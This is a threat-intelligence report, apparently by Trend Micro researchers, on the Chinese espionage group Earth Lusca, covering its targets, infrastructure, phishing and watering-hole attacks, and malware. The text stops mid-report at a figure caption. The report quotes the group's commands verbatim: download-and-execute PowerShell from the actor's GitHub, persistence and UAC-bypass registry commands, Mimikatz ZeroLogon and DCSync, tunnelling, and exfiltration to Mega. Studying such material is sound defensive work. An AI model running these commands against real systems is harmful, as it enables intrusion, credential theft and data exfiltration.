    "plain_text": "# Delving Deep: An Analysis of Earth Lusca’s Operations\n\n#### By Joseph C Chen, Kenney Lu, Gloria Chen, Jaromir Horejsi, Daniel Lunghi, and Cedric Pernet \n\n\n-----\n\n## Overview\n\nNumerous factors have made attribution more difficult today than it has ever been, especially when it\ncomes to attributing cyberespionage operations to threat actors. The infrastructure and malware that\nthreat actors use constantly evolve, and the same actor can even use a totally different set of tools,\ntactics, and procedures (TTPs) from one campaign to another. In addition, several different threat actors\nmight collaborate and share tools, infrastructure, or malware.\n\nIn this tech brief, we are going to expose a threat actor originating from China. Since the malware being\nused by the group, such as ShadowPad and Winnti, overlapped with other threat actors, its activities were\n[attributed to other groups such as APT41, Earth Baku, Sparkling Goblin, and the “Winnti” cluster in](https://documents.trendmicro.com/assets/white_papers/wp-earth-baku-an-apt-group-targeting-indo-pacific-countries.pdf)\ndifferent reports. Our research reveals the different TTPs and the independent set of infrastructure that\nmade us consider it a separate threat actor from the other known actors mentioned. Some reports named\nthis threat actor “TAG-22” or “Fishmonger.” We decided to separate it from the Winnti umbrella and track\nthis threat actor under the name “Earth Lusca.”\n\nOur investigation of Earth Lusca started in mid-2021, when we discovered a campaign targeting customer\nservice companies in China via a watering hole attack. Eventually, our monitoring and research lead to\n[the publication of a blog post on a previously-unreported malware known as BIOPASS RAT. We](https://www.trendmicro.com/en_us/research/21/g/biopass-rat-new-malware-sniffs-victims-via-live-streaming.html)\ncontinued monitoring the threat actor, eventually discovering a few more targeted operations against\nvarious targets worldwide. In this research, we will expose all of the groups TTPs and its current\noperations.\n\nDuring our investigation, we also managed to reach some of the victims and gather interesting\ninformation from compromised servers that were used as watering holes. We were able to learn Earth\nLusca’s reconnaissance and lateral movement techniques while working with our local incident response\nservice team via our XDR system,.\n\nThe goal of this research is to piece together a puzzle of fragmented parts that we do not often see\ntogether — and in turn, provide a clearer picture of the threat actor and its activities.\n\n## Targeting\n\nOur monitoring yielded information on multiple operations from Earth Lusca. Some targets were reported\npublicly in attacks that could be associated to this threat actor. These include:\n\n    - Gambling companies in Mainland China\n\n    - Government institutions in Taiwan, Thailand, Philippines, Vietnam, United Arab Emirates,\nMongolia, and Nigeria\n\n    - Educational institutions in Taiwan, Hong Kong, Japan, and France\n\n    - News media in Taiwan, Hong Kong, Australia, Germany, and France\n\n    - Pro-democracy and human rights political organizations and movements in Hong Kong\n\n    - Covid-19 research organizations in the United States\n\n    - Telecom companies in Nepal\n\n    - Religious movements that are banned in Mainland China\n\n    - Various cryptocurrency trading platforms\n\n\n-----\n\nNote that more industries or countries may have been targeted; our investigation relies on tools and\nmethods that can provide a comprehensive view — but not a complete one.\n\nFigure 1. Affected countries and regions\n\nConsidering the nature of targets and the evidence we found, we believe the goal of their operations is\ncyberespionage. However, they also seem to be financially motivated based on their attacks on gambling\ncompanies and cryptocurrency platforms.\n\n## Infrastructure\n\nTo gain a deeper understanding of Earth Lusca’s operations, we first need to look at the threat actor’s\ninfrastructure, which essentially provides the first piece of the puzzle.\n\n\n-----\n\nFigure 2. Probable Earth Lusca infrastructure based on our findings\n\n### Operating Model \n\nTo gain an overview of the threat actor’s infrastructure, we separated it into two clusters. The first cluster\nis mainly constructed with virtual private servers (VPS) that rent from the service provider Vultr. By\nanalyzing the records from passive DNS databases, the earliest server they used via Vultr could be\n[traced back to April 2019. The infrastructure was mentioned in a report, dated January 2020, covering](https://www.welivesecurity.com/2020/01/31/winnti-group-targeting-universities-hong-kong/)\ntargeted attacks on Hong Kong’s universities.\n\nEarth Lusca built a second cluster mainly composed of compromised web servers beginning around mid2020. We noticed that many of these compromised servers were running old versions of open-source\neditions of Oracle GlassFish Server. Furthermore, it also adopted Cloudflare as a proxy for compromised\nservers to prevent people from finding their server IP addresses directly. However, the passive DNS data\nand the misconfiguration of certificates allowed us to identify some of the compromised servers behind\n[the proxy. A similar analysis of this infrastructure cluster was previously mentioned in an earlier report](https://hello.global.ntt/-/media/ntt/global/insights/white-papers/the-operations-of-winnti-group.pdf)\nfrom the Nippon Telegraph and Telephone (NTT) group.\n\nWe found that these two infrastructure clusters are responsible for different roles in an attack. The first\n[cluster acts as the command-and-control (C&C) server for malware — including Cobalt Strike,](https://www.trendmicro.com/en_ph/research/21/g/tracking_cobalt_strike_a_vision_one_investigation.html)\n[ShadowPad, FunnySwitch, and Winnti — that the group uses to infect victims. The second cluster](https://www.trendmicro.com/vinfo/br/security/news/cybercrime-and-digital-threats/shadowpad-backdoor-found-in-server-management-software)\nsimilarly acted as a Cobalt Strike C&C server — however, it was also used to scan for vulnerabilities in\nthe public-facing servers of their targets or building traffic tunnels within the victim’s network.\n\n\n-----\n\nIn a real-life scenario that we investigated, Earth Lusca owned and used multiple servers, as can be seen\non Figure 2. These servers were split into different roles, which may have been used for single attack\noperations. The initial scanning done by the threat actor came from a different IP address, showing that\nthey deliberately used their servers for a single purpose: to make it more difficult to defend against the\nattack.\n\nScanning by itself is very common, and is not a very accurate method of determining where an attack\ncomes from. An organization’s security team might be misled towards a different direction and actually\nmiss out on detecting the real attack — in essence, the attacker feints an attack to trick defenders down\nthe wrong path.\n\n### Compromised Server as Infrastructure \n\nAs previously mentioned, the actor uses compromised web servers to build their infrastructure. An\nexample of this is the malicious domain “lzfhome[.]xyz”, which shows how the threat actor misused the\ncompromised servers. The domain, which was registered by the threat actor, is a variant of the legitimate\nlzfhome.com domain that belongs to a dissident organization. Yet the hosting server used is a\ncompromised one. The fraudulent domain was first used for a watering hole attack, before being reused\nlater as a Cobalt Strike C&C server.\n\nDate Domain IP Note\nMar 2, 2021 lzfhome[.]xyz Domain registered\nMar 4, 2021 download.lzfhome[.]xyz 172.67.157.190 Cloudflare proxy\nMar 4, 2021 download.lzfhome[.]xyz 104.21.14.47 Cloudflare proxy\nMar 4, 2021 www.lzfhome[.]xyz 172.67.157.190 Cloudflare proxy\nMar 4, 2021 www.lzfhome[.]xyz 104.21.14.47 Cloudflare proxy\nMar 27, 2021 lzfhome[.]xyz 160.16.208.58 Compromised GlassFish server\nMay 6, 2021 lzfhome[.xyz 213.246.45.15 Compromised GlassFish server\nSep 9, 2021 lzfhome[.]xyz 202.143.111.209 Compromised server\nOct 20, 2021 lzfhome[.]xyz 104.21.71.224 Cloudflare proxy\nOct 20, 2021 lzfhome[.]xyz 172.67.172.101 Cloudflare proxy\nTable 1. The resolve history for lzfhome[.]xyz\n\nTable 1 shows the historical DNS resolving result collected from multiple passive DNS databases. We\ndiscovered that the threat actor adopted the Cloudflare proxy to the malicious domain. However, some\nrecords showed that it was also resolved to three web servers across different time periods.\n\nLooking into these web servers, two of them are running GlassFish server opensource edition 4.1, which\ncontains a vulnerability with a publicly available exploit. These web servers do not seem to be used solely\nby Earth Lusca, but are more likely to be compromised as their HTTPS certificates show different\ndomains.\n\n|Date Domain IP Note|Col2|Col3|Col4|\n|---|---|---|---|\n|Mar 2, 2021|lzfhome[.]xyz||Domain registered|\n|Mar 4, 2021|download.lzfhome[.]xyz|172.67.157.190|Cloudflare proxy|\n|Mar 4, 2021|download.lzfhome[.]xyz|104.21.14.47|Cloudflare proxy|\n|Mar 4, 2021|www.lzfhome[.]xyz|172.67.157.190|Cloudflare proxy|\n|Mar 4, 2021|www.lzfhome[.]xyz|104.21.14.47|Cloudflare proxy|\n|Mar 27, 2021|lzfhome[.]xyz|160.16.208.58|Compromised GlassFish server|\n|May 6, 2021|lzfhome[.xyz|213.246.45.15|Compromised GlassFish server|\n|Sep 9, 2021|lzfhome[.]xyz|202.143.111.209|Compromised server|\n|Oct 20, 2021|lzfhome[.]xyz|104.21.71.224|Cloudflare proxy|\n|Oct 20, 2021|lzfhome[.]xyz|172.67.172.101|Cloudflare proxy|\n\n\n-----\n\nAnother interesting aspect we found is that the compromised servers with an open port 8443 adopted\ncertificates provided by Cloudflare. We also observed that the port also has a Cobalt Strike C&C server\nlistening. Similar issues with exposed Cloudflare certificates could be found on other compromised\nGlassFish servers related to Cobalt Strike C&C domains, leading us to believe that the threat actor\ncompromised these web servers and used them as their Cobalt Strike C&C servers.\n\n### Threat Actor’s Originating Region\n\nTracking down the source of the operation can prove to be difficult since threat actors usually hide their\nactivities behind proxy servers located in different countries and regions. Occasionally, however, an\nattacker makes mistakes by forgetting to use their proxies or by misconfiguring them.\n\nWe combined two pieces of data to figure out the possible source region of the threat actor:\n\n   - Our IR team found an IP address that executed commands via web shell on the access log\n\n   - Secure Shell (SSH) access logs show a suspicious IP address connected to a compromised\nserver\n\nWe have confirmed that both IP addresses are not proxy or VPN servers. The IP address lookup results\nshow that the source region is near Sichuan, Chengdu, China.\n\n## Attack Vectors\n\nEarth Lusca employs different attack vectors — such as sending spear phishing messages to employees\nor using watering holes websites — to infect its targets. The group also compromises their victims by\ndirectly exploiting vulnerabilities of public-facing servers. We found that Earth Lusca has been focusing\nless on the former and more on the latter since the second half of 2021.\n\n### Spear Phishing\n\nThrough our telemetry data, we observed Earth Lusca sending spear phishing emails containing a\nmalicious link to a target news organization. The files in the link were presented either as a document that\njournalists might be interested in, or as an opinion form sent by another media organization. The\ndownloaded file is an archive file that contains either a malicious LNK file or an executable file. These\narchives were hosted either on compromised web servers or Google Drive repositories.\n\n\n-----\n\nFigure 3. An example of a malicious archive delivered via spear phishing email\n\nFigure 4. The infection chain of the spear phishing emails\n\nIn some cases, the victims receive an executable file or an SFX installer inside the archive delivered via\nspear phishing that turns out to be a malicious loader. The analysis of the loader is detailed in the\n“Malware Analysis” section.\n\nIn other cases where victims received an LNK file inside the archive, the LNK will execute the\nfile %SYSTEM32%\\forfiles.exe and give the command string shown in the following argument:\n\n_/m \"{name of decoy document}.lnk\" /c \"cmd /c echo f|xcopy @file %temp%\\{random name}.tmp&for /r_\n_c:\\windows\\system32\\ %i in (*sht*.exe) do %i [URL of HTA file}\"_\n\nThe command will move the LNK file into the %TEMP% folder and run mshta.exe to load the malicious\nHTA script from the given URL. The malicious HTA script will then copy certutil.exe to the %APPDATA%\n\n\n-----\n\nfolder and rename it as a different process name — which was chrome.exe in the case we analyzed. The\nLNK file will then be appended with a Base64-encoded string at the end.\n\nThe HTA script will use the “findstr” command to search for the string “TVNDRgAAA” in the LNK file and\nextract the identified Base64-encoded string to another temporary file.\n\nNext, it uses the copied certutil.exe to decode the string to a Cabinet file, after which it uses the “expand”\ncommand to extract the payload from the Cabinet file. The extracted files include a decoy document and\na malware file, which is a Cobalt Strike loader. The HTA file will open the decoy document and launch the\nloader in background.\n\n### Watering Hole\n\nEarth Lusca compromised the websites of their targets or created fake web pages to perform their\nwatering hole attacks. We observed the threat actor copying web pages from legitimate websites and\nmanipulating them to inject malicious JavaScript code. They then deliver the link of these malicious pages\nto their victims to carry out the attack. During another investigation, we found that they also directly\ninjected their malicious script into the HR system of a compromised target. The injected scripts used in\ndifferent cases are similar and are likely modified from a project called “Flash-Pop.”\n\nFigure 5. The script used to check the User-Agent string and send the callback to “ts.php”\n\nThe injected script’s main function is to launch social engineering attacks. During the attack, the injected\nscript will try to detect the browsers User-Agent and avoid attacking mobile devices. It sends a callback\nHTTP request to “ts.php\" to a remote server as another filtering technique. The PHP script “ts.php”\nrecodes the information of request to include the access time, the source IP address and the HTTP\nreferrer header into a log file “vi.txt”. The referrer header shows where the script is triggered from.\n\n\n-----\n\nWhen the PHP script finds a request with a source IP address that hasn’t been recorded in the vi.txt file, it\nwill return HTTP status code 200. The social engineering message will only show up on the watering hole\npage and instruct the targets to download the malware file when the injected script receives code 200\nfrom the PHP script. We believe that this PHP script was used to record the victims’ information as well as\nto avoid a case of double infection on the same target.\n\nThe social engineering messages used in the Earth Lusca attack include requests to update Flash\napplications or showing a DNS resolving error and then asking the victim to download a file. The\ndownloaded files from their watering hole attack are the group’s Cobalt Strike loaders.\n\nFigure 6. The DNS error message pop up found in the watering hole page (translated via Google\nTranslate: “Browser DNS resolution error. Please download and try again after clearing the DNS cache.\n\nOpen website. Download again.”)\n\n\n-----\n\nFigure 7. The Flash update request message pop up on a crafted online video page\n\n#### Server Vulnerabilities \n\nExploiting vulnerabilities in public-facing applications is a tried-and-tested cyberattack technique. Our\nincident response activities found evidence that Earth Lusca also performed these types of attacks.\n\nThese attacks are not exactly the same for every case, but still cover common MITRE ATT&CK Tactics.\n\nReconnaissance\n\n###### Scanning with massive scanners\n\nInitial Access\n\n###### Finding the vulnerability and exploiting it manually\n\nExecution\n###### Dropping 1[st] stage backdoor\n\nFigure 8. MITRE ATT&CK Tactics employed by Earth Lusca\n\n\n-----\n\nOn one occasion, we saw the threat actor exploit an unreported vulnerability via an attack that was\ncustomized to the targeted website, revealing that the attacker possessed advanced skills in penetration\ntesting and exploiting vulnerabilities.\n\nIn the following sections, we detail two public vulnerabilities and how Earth Lusca exploited them.\n\n##### Microsoft Exchange – ProxyShell\n\nSince the first ProxyShell proof-of-concept (PoC) was released on GitHub, several different threat actors\nhave used it in their activities. Some have used it as is without modifying it, while some others have\nrandomized the filenames to make their web shell slightly different.\n\nThis makes it very difficult to distinguish the different threat actors using it. However, we were able to\ndiscover our threat actor via common patterns, which we will discuss in later sections.\n\nFor Earth Lusca’s ProxyShell exploit, the group did not change the filename naming rule “[a-z]{16}.aspx”,\nbut the payload was modified as the following figure:\n\nFigure 9. The ProxyShell payload\n\n[We also identified the management tool as “AntSword,”a cross-platform website management toolkit,](https://github.com/AntSwordProject/antSword)\nbased on network traffic request patterns.\n\nWe suspect that the exploit combines the following public exploits on GitHub:\n\n   - ProxyShell (for the exploit) - https://github.com/dmaasland/proxyshell-poc\n\n   - ProxyLogon (for the payload) - https://github.com/RickGeex/ProxyLogon\n\nOnce Earth Lusca successfully exploits and controls the server, the group will start to install Cobalt Strike\nand perform post-exploitation routines to expand their attack surface.\n\n##### Oracle GlassFish\n\nThere are many GlassFish servers that are vulnerable to attacks. Hunting these vulnerable servers can\nbe done using tools like Shodan. While Shodan is the most popular tool for this activity in North America\nand Europe, similar search engines that are less popular in these regions exist, such as FOFA.\n\n\n-----\n\nFigure 10. Screenshot of the FOFA search engine\n\nFigure 11. GlassFish servers results from searching Shodan and FOFA\n\n[We assume that the threat actor may have located vulnerable GlassFish servers using version 4.1.2](https://www.exploit-db.com/exploits/39441) via\nthe aforementioned search engines before running a publicly available exploit on them. Exploiting the\nvulnerability leads to the uploading of the WAR file containing a JSP file (server-generated webpage),\nwhich in turn contains the web shell.\n\n\n-----\n\nFigure 12. The JSP web shell\n\nThis particular web shell needs to encrypt and decrypt data on the fly, making its behavior match an\n[infamous website management tool known as “Behinder,” a closed source project](https://github.com/rebeyond/Behinder) but with a client\navailable for free on GitHub.\n\nEarth Lusca also dropped an SSH-authorized key on the “/root/.ssh” folder in order to access the server\nwith SSH.\n\nThe group also installed a software called “Acunetix Web Vulnerability Scanner” on compromised\nGlassFish servers. This tool is a powerful commercially-available web vulnerability scanner, typically used\nby professional penetration testers for security assessment. Our findings on this end mirror the\nobservations noted in NTT’s report.\n\nWe noticed some of compromised servers were running Acunetix as the web login panel opened. Earth\nLusca seems to use it as a reconnaissance tool. The scanning usually generates plenty of noise and\nvolume traffic on the target website.\n\n#### A Notification System for Cobalt Strike\n\nSpear phishing and watering hole attacks are very common techniques, but they are sometimes difficult\nto track for the attacker. Once the backdoor is triggered by an unsuspecting user, the threat actor needs\nto know about it to process the next steps in the attack.\n\nOn one compromised server being used as a watering hole, we found a mystery CNA file written in the\nscripting language “Aggressor Script,” which allows users to modify and extend the Cobalt Strike client.\n\n\n-----\n\nIn the CNA script, when a new beacon is initialized, the client information is extracted and sent to a\nremote server, thereby notifying the attacker.\n\nFigure 13. The notification CNA script\n\n[The script was modified from another popular script, which sends a message via a public service called](https://www.cnblogs.com/trevain/p/13693215.html)\n“ServerChan.”\n\nThe threat actor modified the endpoint of the API and slightly reduced the amount of information sent. It is\nhighly likely that the script enhanced the attacker’s agility regarding the attack sequence.\n\n### Post Exploitation\n\nA Chinese proverb states that “A workman must first sharpen his tools if he is to do his work well,” which\nbasically says that one needs the right tool for the job. This principle also applies to threat actors.\n\nIn the next two primary sections covering the post exploitation routines and related malware, we provide\nan overview of the tools, tactics, techniques, and procedures collected from our feedback and incident\nresponse activities, and information from the compromised servers.\n\nWe will also share an interesting storage space on GitHub that we managed to link to this group. This\nGitHub repository contains information that provided us with a much better understanding of Earth Lusca.\n\n\n-----\n\n###### GitHub Link https://github.com/yuilbrun/hmm/\n\n#### Reconnaissance\n\nEarth Lusca collected information from several Windows utilities, including “net,” “nltest,” “ipconfig,”\n“netstat,” and “tasklist,” to obtain information on user accounts, domain controllers, and network\nconfigurations from the compromised systems. We also noticed the third-party tools adfind and\n[PowerSploit](https://github.com/PowerShellMafia/PowerSploit) being used during the reconnaissance phase. The following command was used by the\nthreat actor to load PowerSploit to discover the other machines in the same domain.\n\n_powershell IEX (New-Object_\n_Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/mast_\n_er/Recon/PowerView.ps1’);Get-NetComputer -FullData > [file path]_\n\n#### Discovery\n\nWe have seen the threat actor using multiple scanning tools in different incidents to discover other\nmachines in the same compromised network environment.\n\n**Tool Name** **Command**\nHUC Port Banner _hbs.exe 172.16.10.1-172.16.10.254 /m 445,3389,1433,3306,80,443_\nScanner\n\nnbtscan _nbtscan.exe 172.16.1.1/16_\nfscan _fscanx86.exe -h 172.16.2.0/24 -m smb -t 100_\n\nTable 2. Scanning tools and observed commands\n\n[NBTscan](https://github.com/scallywag/nbtscan) is a tool that helps users discover the network environment and any shared folders by scanning\n[for NetBIOS name information. Fscan, on the other hand, is a comprehensive internal network scanning](https://github.com/shadow1ng/fscan)\n[tool](https://github.com/shadow1ng/fscan) — written in Golang — that provides numerous functions including network scanning, vulnerability\nscanning, building reverse shells, and brute forcing common services.\n\nWe could not find much information about hbs.exe. However, we identified a few file named “hbs.exe” on\nVirusTotal — possibly from the same threat actor since the files are signed with the same stolen\ncertificate that Earth Lusca used to sign the other malware binaries. Analysis of the files revealed that it\ncontained the string “HUC Port Banner Scanner,” which indicates that it is a port scanning tool.\n\nEarth Lusca also checked the Windows event log to find the network information of the successfully\n[logged-in accounts (Event ID 4624). This allows the group to discover the addresses of other machines.](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4624)\nThe following commands were used for this:\n\n_powershell “Get-EventLog -LogName security -Newest 500 | where {$_.EventID -eq 4624} | format-list -_\n_property * | findstr “Address””_\n\n_wevtutil qe security /format:text /q:”Event[System[(EventID=4624)] and_\n_EventData[Data[@Name=’TargetUserName’]=’administrator’]]”|find “Source Network Address”_\n\n|Tool Name|Command|\n|---|---|\n|HUC Port Banner Scanner|hbs.exe 172.16.10.1-172.16.10.254 /m 445,3389,1433,3306,80,443|\n|nbtscan|nbtscan.exe 172.16.1.1/16|\n|fscan|fscanx86.exe -h 172.16.2.0/24 -m smb -t 100|\n\n\n-----\n\nIn addition, we saw that the threat actor employed a PowerShell script (RDPConnectionParser.ps1) to\nread and filter the Windows event log “Microsoft-Windows-TerminalServices-RDPClient/Operational”\n(Event ID 1024) in order to obtain the network information from remote desktop protocol (RDP)\nconnections. This script is available publicly.\n\nWe observed the following PowerShell command being used to launch the script.\n\n_powershell IEX (New-_\n_ObjectNet.WebClient).DownloadString(‘https://raw.githubusercontent.com/yuilbrun/hmm/master/tas389_\n_.ps1’)_\n\nIt’s worth mentioning that Earth Lusca didn’t download the script from repositories that hosted it.\nHowever, they uploaded the script to their GitHub repository, yuibrun/hmm. We believe that the threat\nactor owns this GitHub account since it also has attack tools and malware uploaded to it. We will share\nour findings on the GitHub account in the “Additional Findings” subsection.\n\n#### Persistence and Privilege Escalation\n\nEarth Lusca devised several approaches to maintain its access to the victim’s system and retain\npersistence even after reboot. A common method we observed was via the creation of a service that\npretended to be a system update service. A previously prepared Cobalt Strike loader was then uploaded\nto the victim’s system, after which the created service will run a command to launch the loader. The\ncreation of scheduled tasks and the registering of initialization scripts were also used to maintain the\nexecution of Earth Lusca’s malware.\n\nWe observed the following commands in different incidents:\n\n_sc create “SysUpdate” binpath= “cmd /c start “[file path]””&&sc config “SysUpdate” start= auto&&net_\n_start SysUpdate_\n\n_schtasks /Create /SC ONLOgon /TN WindowsUpdateCheck /TR “[file path]” /ru system_\n\n_reg add “HKEY_CURRENT_USER\\Environment” /v UserInitMprLogonScript /t REG_SZ /d “[file path]”_\n\nWe also noticed two other persistence techniques leveraging existing system services. First, we found the\nthreat actor placing their payload in the location “%WINDIR%\\SYSTEM32\\oci.dll”. The DLL file does not\nexist in the system by default but will be loaded by the MSDTC service. This allows the attacker to place\n[an arbitrary payload that will be sideloaded by the MSDTC service. We reported the use of this technique](https://blog.trendmicro.com/trendlabs-security-intelligence/shadow-force-uses-dll-hijacking-targets-south-korean-company/)\nin another APT attack research.\n\nIn another incident, we saw the threat actor dropping their payload into\n“%WINDIR%\\SYSTEM32\\spool\\prtprocs\\x64\\spool.dll” and registering the DLL name as a Windows print\nprocessor. The payload was loaded by the Print Spooler service after the actor restarted the system\n[service “spooler.” A similar trick was reportedly being used by the “PipeMon” malware, as seen in the](https://www.welivesecurity.com/2020/05/21/no-game-over-winnti-group/)\nfollowing command:\n\n_move [file path] c:\\windows\\system32\\spool\\prtprocs\\x64\\spool.dll_\n\n\n-----\n\n_reg add “HKLM\\SYSTEM\\ControlSet001\\Control\\Print\\Environments\\Windows x64\\Print_\n_Processors\\UDPrint” /v Driver /d “spool.dll” /f_\n_sc stop spooler_\n_sc start spooler_\n\n[We observed that the actor used the Fodhelper UAC bypass technique](https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/) to gain elevated privileges via the\nfollowing commands:\n\n_reg add HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\Shell\\Open\\command\\ /t REG_SZ /d_\n_“%appdata%\\[file name]” /f_\n_reg add HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\Shell\\Open\\command\\ /v_\n_DelegateExecute /t REG_SZ /d “” /f_\n_fodhelper.exe_\n_reg delete HKEY_CURRENT_USER\\Software\\Classes\\ms-settings /f_\n\nWe also found the open-source tool BadPotato to be used Earth Lusca to gain higher privileges:\n\n_C:\\ProgramData\\badpotato.exe whoami_\n\n#### Credential Access\n\nTo gain greater access to the victim’s internal network, the threat actor will first target user credentials.\nWe observed Earth Lusca using the procdump tool to obtain the hashes of these credentials by dumping\nthe memory of the lsass process which is a technique often used by attackers. In additional, they used\nMimikatz to exploit the domain controller via the ZeroLogon exploit.\n\nAfter a successful exploitation, the threat actor inputs a DCSync command with Mimikatz which allows the\ngroup to retrieve the credentials from the exploited controller:\n\n_mimikatz32.exe “lsadump::zerologon /target:10.0.0.18 /account:[account name]$” “exit”_\n_mimikatz32.exe “lsadump::zerologon /target:10.0.0.18 /account:[account name]$” /exploit “exit”_\n_mimikatz32.exe lsadump::dcsync „exit“_\n\n#### Proxy\n\nEarth Lusca established network tunnels between the target’s network and external servers. The external\nservers connected by these tunnels belong to the second cluster of servers we mentioned in the\n“Infrastructure” section. By matching the parameters of the commands, we were able to determine the\nproxy tools they used even after they renamed the binary.\n\n|Tool Name|Command|\n|---|---|\n|lcx|xs.exe -connect [ip address] [port number]|\n|frp|frpc.exe -c frpc.ini|\n\n\n-----\n\n|EarthWorm|we.exe -s rssocks -d [ip address] -e [port number]|\n|---|---|\n\n\nTable 3. Proxy tools and observed commands\n\n#### Exfiltration\n\nTo exfiltrate a large number of files from a target folder, we observed Earth Lusca using WinRAR to\ncompress the files into an archive and then using the megacmd tool to upload the archive to Mega\nservice. The megacmd tool is not an official one, nevertheless, setting up the tool is even easier than\nconfiguring the official tool, since only a simple json file with predefined credentials is needed, after which\nan attacker can place the tool on the victim’s machine and upload it via the company network — making it\nsimilar, in a way, to DropBox or Google Drive.\n\n_Rar a -v3g -k -r -s -m3 [compressed file] [target path]_\n_megacmd -conf [config] put [file] mega:[upload path]_\n\n#### Additional Findings \n\nDuring investigation, we found that Earth Lusca loaded a PowerShell script from the GitHub repository\nyuibrun/hmm. A look into the repository revealed other attack tools as well as malware, including:\n\n    - JSP (Behinder), Perl (Gamma Web Shell), C# and PHP web shells\n\n    - Python scripts for port scanning or building reverse shells\n\n    - A Visual Basic for Applications (VBA) script (wmi.vba) to execute Windows Management\nInstrumentation (WMI)\n\n    - Exploit tools such as DirtyCow, SMBGhost and JuicyPotato\n\n    - Cobalt Strike loaders and XMR miners\n\n    - Winnti malware, loader, and the install script (Linux version)\n\nOne of the Cobalt Strike samples\n(4814e8baf52df7a17af3d88aba38d7bce4aed753a05b3d64478d4efedccc6625) found on the repository\nconnected to the C&C domain coivo2xo[.]livehost[.]live, which the group reportedly owns. The JSP web\nshell Behinder was also identified on compromised GlassFish servers, as mentioned in the server\nvulnerabilities subsection.\n\n[The Linux version sample of Winnti (libxselinux) was also found on the repository, including the loader](https://medium.com/chronicle-blog/winnti-more-than-just-windows-and-gates-e4f03436031a)\n(libxselinux.so), and the install script (install). The threat actor was reported to have previously used the\nWinnti malware in their attacks. These clues point to the likelihood that Earth Lusca owns this repository.\n\n\n-----\n\nFigure 14. The GitHub repository hosting web shells, malware, and attack scripts\n\n### Malware Analysis\n\n#### Cobalt Strike Loader\n\nThe threat actor often employs penetration testing tools such as Cobalt Strike. Custom Cobalt Strike\nloaders were identified in attacks associated with Earth Lusca that were found to be delivered via spear\nphishing emails or watering hole attacks, typically involving documents or applications. Once the user\nexecutes the loader, it will open the decoy document or the application that it pretends to be.\n\nIn the background, however, it also downloads a Cobalt Strike shellcode that is XOR encoded with a XOR\nkey. We have observed different XOR keys being used in different loaders, including “fish_master,”\n“fishdownload,” and “azdx64x64.” Additional research found other encryption or encoding techniques\nused in their loaders to hide shellcode.\n\n  - XOR with single byte\n\n  - XOR with multi-bytes\n\n  - AES 256\n\n  - DES\n\n\n-----\n\n  - Base64\n\n  - Steganography\n\nIn the case of steganography, the loader downloads a BMP image file instead of an encoded shellcode.\nThe attacker then uses steganography to hide shellcode into an image. The loader then extracts it from\nthe picture to retrieve the Cobalt Strike shellcode.\n\nFigure 15. Steganography image contains randomly colored pixels at the bottom\n\nHere are the steps to extract the shellcode from the picture: The first step involves reading a DWORD\nvalue from the address 0x0A (the green text in figure 16), which tells the offset (bfOffBits) where the data\nstarts (blue text). It then moves a displacement value to bfOffBits — which was “3” in the cases we\nobserved. Starting with the byte at offset bfOffBits+3, this byte is part of the HEX value of the original\nshellcode (red text). It adds an interval value, which is “4” in this case. This byte is another part of the\nshellcode’s HEX value (red text).\n\nThe process will keep adding the interval value, eventually getting the HEX value to construct the original\nshellcode. We have also seen a variant of the process that subtracts each HEX value with the value “1” to\nobtain the original HEX value.\n\nFigure 16. An example of the shellcode inside the BMP image file\n\n[For Earth Lusca’s more recent samples, the threat actor also started to use the “MITRE – Hijack](https://attack.mitre.org/techniques/T1574/002/)\n[Execution Flow: DLL Side-Loading” technique to leverage valid code-signed executions, for which the](https://attack.mitre.org/techniques/T1574/002/)\nfollowing files are used:\n\n  - e6bad7f19d3e76268a09230a123bb47d6c7238b6e007cc45c6bc51bb993e8b46\n\n  - 7e35078106bd59b739b1d1fb6ad16d56c3adaf9f10d2e206a1b9b23d64b25cd0\n\n  - a72ea60be2adb8f15bbec86910dc1c1f41abe888fb87b1f3f902dcaa85e774f6\n\n  - 4b8d15492687e46f939924a3a44b0f9b276229598433fb1380f8b6f46221416d\n\n\n-----\n\n#### Doraemon\n\n[While this backdoor is already quite old, it is rarely discussed by the general public. Recently mentioned](https://www.welivesecurity.com/2021/08/24/sidewalk-may-be-as-dangerous-as-crosswalk/)\n[by ESET in their SideWalk report, we first encountered Doraemon around 2016 in incidents involving](https://www.welivesecurity.com/2021/08/24/sidewalk-may-be-as-dangerous-as-crosswalk/)\nKorean and Taiwanese online gaming companies. It then disappeared from view for about three years\nuntil we encountered it again in 2020.\n\nThe naming of the backdoor comes from the fact that it contains an original DLL filename Doraemon.dll,\n\nand the PDB strings “D:\\资料\\C++\\Doraemon\\x64\\Release\\mem_dll.pdb” contained in the project name\n\nfrom an early version circa 2016. The name is originally from a Japanese manga series.\n\nThe backdoor usually contains two C&C settings, the first C&C setting being a primary one that is IP or\nDNS, while the second one is a public website URL that contains encrypted or clear text C&C IP\naddresses, so even if the first IP/C&Cs are blocked, the threat actor still has a way to achieve\npersistence.\n\nFigure 17. Encrypted and clear text C&C IP addresses\n\nIt’s not clear how Earth Lusca delivered this backdoor to victims. Nevertheless, we found two samples\nconnected to C&C domains that belong to Earth Lusca’s infrastructure.\n\n#### FunnySwitch\n\n[FunnySwitch is a .NET Framework backdoor that usually starts with the “MITRE – Hijack Execution](https://attack.mitre.org/techniques/T1574/001/)\n[Flow: DLL Search Order Hijacking” technique and executes inside a legal process that was mentioned](https://attack.mitre.org/techniques/T1574/001/)\nand analyzed by Positive Technologies in 2020.\n\nMost known samples are placed in C:\\Windows\\System32\\oci.dll, which starts with msdtc.exe. However,\nwe recently found new samples that leverage the signed McAfee executable file\n(e6bad7f19d3e76268a09230a123bb47d6c7238b6e007cc45c6bc51bb993e8b46).\n\nThese new DLL files both contain a unique PDB string:\n\n  - E:\\VS2019_Project\\while_dll_ms\\whilte\\x64\\Release\\macoffe.pdb\n\nWe have found and checked two similar DLL files, with one supporting payload encryption, and another\nthat does not.\n\n\n-----\n\nFigure 18. The decryption function\n\nThe time stamp is only slightly different — around 9 days — but the entry function has changed, which\nmeans development is very active and the backdoor is rapidly being evolved.\n\n\n-----\n\nFigure 19.

